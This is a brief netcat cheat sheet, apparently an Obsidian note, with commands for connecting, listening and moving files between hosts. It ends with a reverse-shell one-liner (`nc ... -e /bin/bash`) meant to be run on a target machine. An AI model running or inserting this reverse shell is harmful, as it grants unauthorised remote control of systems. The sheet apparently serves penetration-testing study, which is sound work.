# Netcat
Read and Write data in the network using TCP or UDP.

## Commands


I.e. connect to an arbitrary port on an IP address:

```bash
$ nc [IP] [PORT]
```

## 

Basic Listener

I.e. receive connections on an arbitrary port:

```bash
$ nc -lp [PORT]
```

## 

File Transfer

Setup a listener on host that pushes to an outfile:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

From the client (remote machine), push a file back to the listener:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

## 

Send a Reverse Shell

From target machine:

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

# 

Tags

[#cheat-sheet](app://obsidian.md/index.html#cheat-sheet)